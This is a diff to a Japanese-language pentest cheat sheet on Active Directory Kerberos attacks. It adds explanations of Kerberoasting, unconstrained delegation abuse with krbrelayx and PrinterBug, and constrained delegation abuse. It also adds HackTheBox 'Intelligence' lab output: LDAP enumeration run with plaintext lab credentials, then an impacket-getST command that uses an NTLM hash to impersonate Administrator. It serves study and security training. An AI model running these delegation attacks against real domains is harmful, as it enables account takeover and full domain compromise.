@@ -152,6 +152,7 @@
 
 ## Kerberoasting
 * ユーザに紐付けられたサービスのTGSを取得する
+* ユーザーまたはコンピューターがKerberosを使用し（例えば）SMB経由でホストに認証する場合、Windowsはサービスチケットの要求をドメインコントローラーに送信する。この要求には、プロトコルとサービスが存在するホストから構成されるサービスプリンシパル名（SPN）が含まれる。ドメインコントローラーは、前記SPNが割り当てられているアカウントのディレクトリでルックアップし、発見したアカウントに関連付けられているKerberosキーを使用してサービスチケットを暗号化する。前記Kerberosキーは、発見したアカウントのパスワードから生成される。
 * servicePrincipalNameを有するユーザが攻撃対象
 * HTB: Active
 
@@ -236,24 +237,67 @@
   ```
 
 ## Unconstrained Delegation Attack
-* 特定のアカウントから特定のサービスへの制約のない委任が許可されている時、任意のユーザに成りすまし（Impersonate）てTGSを取得可能
-* Kerberos以外のプロトコル（NTLM他）に対応するために、S4U2Selfが任意のユーザのTGSを生成することが原因
-* msDS-AllowedToDelegateToが特定サービスへの制約のない委任を示す
-* 侵害したアカウントのSPNを書き換え可能な場合、[krbrelayx/krbrelayx](https://github.com/dirkjanm/krbrelayx)を利用し、TGTなどの取得が可能
-  * ドメインコントローラのTGTが取得できれば、DCSync Attackを実行可能
-  * 詳細は[“Relaying” Kerberos - Having fun with unconstrained delegation](https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/)を参照
-* 詳細は[Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)を参照
+* 制約のない委任が許可されている時、侵害したアカウントのSPNを攻撃者サーバに改ざんすることで、前記SPNのTGSを要求したユーザのTGTを取得可能
+* ldapのuserAccountControlプロパティに**TRUSTED_FOR_DELEGATION**フラグが設定されているアカウントが攻撃対象
+* [krbrelayx/krbrelayx](https://github.com/dirkjanm/krbrelayx)を利用し、ユーザから送信されたTGTを受信する攻撃者サーバを構築
+  * 高権限を有するユーザがドメインコントローラに特定のSPN（この場合は改ざんしたSPN）のTGSを要求するよう、攻撃者はPrinterBugやPrivExecの脆弱性を利用する必要がある
+* 詳細は[“Relaying” Kerberos - Having fun with unconstrained delegation](https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/)を参照
 
+## Constrained Delegation Attack
+* 制約付き委任が許可されている時、任意のユーザに成りすまして**msDS-AllowedToDelegateTo**プロパティが示すサービスのTGSを取得可能
+* ldapのuserAccountControlプロパティに**TRUSTED_TO_AUTH_FOR_DELEGATION**フラグが設定されているアカウントが攻撃対象
+  * 制約付き委任ではS4U2SelfおよびS4U2Proxyと呼ばれるKerberosプロトコル拡張のセットを利用
+  * **TRUSTED_TO_AUTH_FOR_DELEGATION**フラグの設定により、S4U2Selfで任意のユーザに成りすましてTGSを取得する機能が有効化される
+* 詳細は[Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)を参照
 * HTB: Intelligence
 
   ```console
-  ┌─[✗]─[rio@parrot]─[~/Htb/Intelligence]
-  └──╼ $ldapsearch -x -D ted.graves@intelligence.htb -w Mr.Teddy -h intelligence.htb -b 'cn=svc_int,cn=managed service accounts,dc=intelligence,dc=htb'
+  ┌─[rio@parrot]─[~/Htb/Intelligence]
+  └──╼ $pywerview/pywerview.py get-adobject -u ted.graves -p Mr.Teddy -t intelligence.htb --name svc_int
+  accountexpires:                 never
+  badpasswordtime:                1601-01-01 09:00:00
+  badpwdcount:                    0
+  cn:                             svc_int
+  codepage:                       0
+  countrycode:                    0
+  distinguishedname:              CN=svc_int,CN=Managed Service Accounts,DC=intelligence,DC=htb
+  dnshostname:                    svc_int.intelligence.htb
+  dscorepropagationdata:          1601-01-01 00:00:00
+  instancetype:                   4
+  iscriticalsystemobject:         FALSE
+  lastlogoff:                     1601-01-01 09:00:00
+  lastlogon:                      2021-06-30 09:56:22.553403
+  lastlogontimestamp:             2021-06-30 09:56:22.553403
+  localpolicyflags:               0
+  logoncount:                     1
+  msds-allowedtodelegateto:       WWW/dc.intelligence.htb
+  msds-groupmsamembership:        010004801400000000000000000000002400000001020000000000052000000020020000040050000200000000002400ff01...
+  msds-managedpasswordid:         010000004b44534b02000000670100001d0000001800000059ae9d4f448f56bf92a5f4082ed6b61100000000220000002200...
+  msds-managedpasswordinterval:   30
+  msds-managedpasswordpreviousid: 010000004b44534b02000000670100001b0000001000000059ae9d4f448f56bf92a5f4082ed6b61100000000220000002200...
+  msds-supportedencryptiontypes:  28
+  name:                           svc_int
+  objectcategory:                 CN=ms-DS-Group-Managed-Service-Account,CN=Schema,CN=Configuration,DC=intelligence,DC=htb
+  objectclass:                    ['top', 'person', 'organizationalPerson', 'user', 'computer', 'msDS-GroupManagedServiceAccount']
+  objectguid:                     f180a079-f326-49b2-84a1-34824208d642
+  objectsid:                      S-1-5-21-4210132550-3389855604-3437519686-1144
+  primarygroupid:                 515
+  pwdlastset:                     2021-06-30 09:54:47.975284
+  samaccountname:                 svc_int$
+  samaccounttype:                 805306369
+  useraccountcontrol:             ['WORKSTATION_TRUST_ACCOUNT', 'TRUSTED_TO_AUTH_FOR_DELEGATION']
+  usnchanged:                     106739
+  usncreated:                     12846
+  whenchanged:                    2021-06-30 00:56:22
+  whencreated:                    2021-04-19 00:49:58
+  
+  ┌─[rio@parrot]─[~/Htb/Intelligence]
+  └──╼ $ldapsearch -x -D ted.graves@intelligence.htb -w Mr.Teddy -h intelligence.htb -b 'dc=intelligence,dc=htb' name=svc_int
   # extended LDIF
   #
   # LDAPv3
-  # base <cn=svc_int,cn=managed service accounts,dc=intelligence,dc=htb> with scope subtree
-  # filter: (objectclass=*)
+  # base <dc=intelligence,dc=htb> with scope subtree
+  # filter: name=svc_int
   # requesting: ALL
   #
   
@@ -270,9 +314,9 @@
    tb
   instanceType: 4
   whenCreated: 20210419004958.0Z
-  whenChanged: 20210715114248.0Z
+  whenChanged: 20210630005622.0Z
   uSNCreated: 12846
-  uSNChanged: 110737
+  uSNChanged: 106739
   name: svc_int
   objectGUID:: eaCA8SbzskmEoTSCQgjWQg==
   userAccountControl: 16781312
@@ -281,13 +325,13 @@
   countryCode: 0
   badPasswordTime: 0
   lastLogoff: 0
-  lastLogon: 132708229761633211
+  lastLogon: 132694881825534026
   localPolicyFlags: 0
   pwdLastSet: 132694880879752841
   primaryGroupID: 515
   objectSid:: AQUAAAAAAAUVAAAARobx+nQXDcpGY+TMeAQAAA==
   accountExpires: 9223372036854775807
-  logonCount: 3
+  logonCount: 1
   sAMAccountName: svc_int$
   sAMAccountType: 805306369
   dNSHostName: svc_int.intelligence.htb
@@ -295,7 +339,7 @@
    ion,DC=intelligence,DC=htb
   isCriticalSystemObject: FALSE
   dSCorePropagationData: 16010101000000.0Z
-  lastLogonTimestamp: 132708229689371121
+  lastLogonTimestamp: 132694881825534026
   msDS-AllowedToDelegateTo: WWW/dc.intelligence.htb
   msDS-SupportedEncryptionTypes: 28
   msDS-ManagedPasswordId:: AQAAAEtEU0sCAAAAZwEAAB0AAAAYAAAAWa6dT0SPVr+SpfQILta2E
@@ -309,12 +353,25 @@
    AAIAAAAAACQA/wEPAAEFAAAAAAAFFQAAAEaG8fp0Fw3KRmPkzOgDAAAAACQA/wEPAAEFAAAAAAAFF
    QAAAEaG8fp0Fw3KRmPkzHYEAAA=
   
+  # search reference
+  ref: ldap://ForestDnsZones.intelligence.htb/DC=ForestDnsZones,DC=intelligence,
+   DC=htb
+  
+  # search reference
+  ref: ldap://DomainDnsZones.intelligence.htb/DC=DomainDnsZones,DC=intelligence,
+   DC=htb
+  
+  # search reference
+  ref: ldap://intelligence.htb/CN=Configuration,DC=intelligence,DC=htb
+  
   # search result
   search: 2
   result: 0 Success
   
-  # numResponses: 2
+  # numResponses: 5
   # numEntries: 1
+  # numReferences: 3
+  
   ┌─[rio@parrot]─[~/Htb/Intelligence]
   └──╼ $impacket-getST -dc-ip intelligence.htb -spn WWW/dc.intelligence.htb -impersonate Administrator -hashes :d64b83fe606e6d3005e20ce0ee932fe2 intelligence.htb/svc_int
   Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
@@ -553,3 +610,4 @@
 ----
 
 * [Penetration Testing Active Directory, Part II](https://hausec.com/2019/03/12/penetration-testing-active-directory-part-ii/)
+* [No Shells Required - a Walkthrough on Using Impacket and Kerberos to Delegate Your Way to DA](http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html)
